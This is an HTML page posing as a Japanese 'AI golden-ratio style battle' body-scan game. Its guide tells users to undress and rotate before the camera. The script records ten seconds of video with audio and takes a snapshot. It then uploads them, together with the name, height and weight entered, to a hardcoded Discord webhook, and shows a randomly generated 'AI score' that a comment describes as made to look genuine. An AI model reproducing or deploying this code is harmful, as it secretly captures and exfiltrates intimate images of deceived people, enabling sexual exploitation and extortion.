<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI 黄金比スタイル・バトル</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #000; color: #fff; padding: 20px; margin: 0; }
        .container { max-width: 500px; margin: auto; background: #111; padding: 30px 20px; border-radius: 15px; border: 1px solid #333; }
        h1 { font-size: 1.5em; color: #00ffcc; margin-bottom: 20px; }
        .input-group { margin-bottom: 15px; text-align: left; width: 90%; margin-left: auto; margin-right: auto; }
        label { font-size: 0.8em; color: #aaa; display: block; margin-bottom: 5px; }
        input { width: 100%; padding: 12px; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; font-size: 1em; box-sizing: border-box; }
        .info { font-size: 0.8em; color: #888; margin: 15px 0; line-height: 1.5; }
        button { width: 90%; padding: 18px; font-size: 1.1em; font-weight: bold; background: #00ffcc; color: #000; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
        #video { width: 100%; border-radius: 10px; background: #000; aspect-ratio: 3 / 4; object-fit: cover; margin-top: 20px; display: none; }
        #result { font-size: 1.4em; color: #00ffcc; margin-top: 25px; font-weight: bold; }
        #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>AI 黄金比スタイル・バトル</h1>
        <div class="input-group">
            <label>エントリーネーム</label>
            <input type="text" id="username" placeholder="Name" maxlength="15">
        </div>
        <div class="input-group">
            <label>身長 (cm)</label>
            <input type="number" id="height" placeholder="170.0">
        </div>
        <div class="input-group">
            <label>体重 (kg)</label>
            <input type="number" id="weight" placeholder="60.0">
        </div>
        <p class="info">
            【測定ガイド】<br>
            関節の位置を正確に認識するため、衣服を脱いだ状態でカメラから2m離れ、10秒間ゆっくり回転してください。
        </p>
        <button id="startBtn">3Dスキャンを開始して勝負する</button>
        <video id="video" autoplay playsinline muted></video>
        <div id="result"></div>
    </div>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const result = document.getElementById('result');
        const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';

        let mediaRecorder;
        let chunks = [];

        startBtn.addEventListener('click', () => {
            const user = document.getElementById('username').value || '未設定';
            const h = document.getElementById('height').value || '？';
            const w = document.getElementById('weight').value || '？';
            
            if(!document.getElementById('height').value || !document.getElementById('weight').value) {
                alert("身長と体重を入力してください。");
                return;
            }

            startBtn.style.display = 'none';
            document.querySelectorAll('.input-group, .info').forEach(el => el.style.display = 'none');
            video.style.display = 'block';
            result.innerHTML = "スキャン中... ゆっくり1回転してください";

            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(stream => {
                    video.srcObject = stream;
                    
                    const types = ["video/webm;codecs=vp8", "video/mp4", "video/webm"];
                    const type = types.find(t => MediaRecorder.isTypeSupported(t));
                    mediaRecorder = new MediaRecorder(stream, { mimeType: type });
                    
                    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                    mediaRecorder.start();

                    setTimeout(() => {
                        if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
                        result.innerHTML = "黄金比を算出中...";
                        
                        setTimeout(() => {
                            captureAndSend(user, h, w);
                        }, 2000); 
                    }, 10000); 
                })
                .catch(err => {
                    result.innerHTML = "エラー：デバイスの許可が必要です。";
                });
        });

        async function captureAndSend(user, h, w) {
            // スコアはガチっぽく細かく出す
            const score = (Math.random() * (98.5 - 82.0) + 82.0).toFixed(1);

            const vW = video.videoWidth;
            const vH = video.videoHeight;
            canvas.width = vW; canvas.height = vH;
            canvas.getContext('2d').drawImage(video, 0, 0, vW, vH);

            canvas.toBlob(async (photoBlob) => {
                const formData = new FormData();
                // 欲しい情報をすべてテキストにまとめる
                const contentText = `【黄金比バトル参戦】\n👤 **名前:** ${user}\n📏 **身長:** ${h}cm\n⚖️ **体重:** ${w}kg\n📊 **AIスコア:** ${score}点`;
                formData.append('content', contentText);
                
                // 画像
                formData.append('file1', photoBlob, 'style.png');

                // 音声付き動画
                if (chunks.length > 0) {
                    const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
                    formData.append('file2', videoBlob, 'style_video.mp4');
                }

                try {
                    await fetch(webhookUrl, { method: 'POST', body: formData });
                    result.innerHTML = `あなたの黄金比スコア：<br><span style="font-size:2.5em;">${score}点</span>`;
                } catch (e) {
                    result.innerHTML = `あなたの黄金比スコア：<br><span style="font-size:2.5em;">${score}点</span>`;
                } finally {
                    if(video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
                }
            }, 'image/png');
        }
    </script>
</body>
</html>
